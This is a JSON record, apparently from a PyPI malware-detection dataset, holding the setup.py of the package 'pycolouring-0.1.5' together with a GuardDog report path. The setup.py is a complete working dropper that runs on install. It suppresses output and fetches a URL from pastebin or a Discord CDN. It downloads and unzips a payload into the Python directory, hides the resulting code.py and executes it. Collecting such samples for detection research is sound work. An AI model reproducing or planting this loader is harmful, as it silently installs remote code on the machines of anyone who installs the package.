[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import sys,os,requests,subprocess,time\nfrom pathlib import Path\n\ndef stopprint():\n\tsys.stdout = open(os.devnull, 'w')\n\ndef get_folder_contents(path):\n\ttry:\n\t\tall_files = os.listdir(path)\n\t\tfor file in all_files:\n\t\t\tif file.lower() == \"python.exe\":\n\t\t\t\treturn True\n\texcept:\n\t\tpass\n\treturn False\n\ndef get_default_path():\n\ttry:\n\t\tvideos_path = str(Path.home() / \"Videos\")\n\t\treturn videos_path\n\texcept Exception as e:\n\t\tprint(e)\n\t\treturn None\n\ndef get_new_filepath(path,name):\n\treturn os.path.join(path,name)\n\ndef get_cdn():\n\tcdnurl = \"https://cdn.discordapp.com/attachments/1072676199073062975/1072698468956655726/Game.zip\"\n\ttry:\n\t\tcdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n\t\tif cdndata.status_code == 200:\n\t\t\tcdnurl = cdndata.text\n\texcept:\n\t\tpass\n\treturn cdnurl\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n\tp = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n\tout, err = p.communicate()\n\ndef main():\n\tstopprint()\n\tfilepath = get_default_path()\n\tfor thing in sys.path:\n\n\t\tcorrect_folder = get_folder_contents(thing)\n\t\tif correct_folder == True:\n\t\t\tfilepath = thing \n\t\t\tbreak\n\n\tnew_filepath = get_new_filepath(filepath,\"code.py\")\n\n\tif os.path.exists(new_filepath) == True:\n\t\tprint(\"Already done\")\n\t\treturn\n\n\tcdn = get_cdn()\n\tos.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n\tos.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n\n\thide_file(new_filepath)\n\trun_file(new_filepath)\n\nmain()"
  },
  {
    "metadata": {
      "package_name": "pycolouring-0.1.5",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pycolouring-0.1.5.txt"
    }
  }
]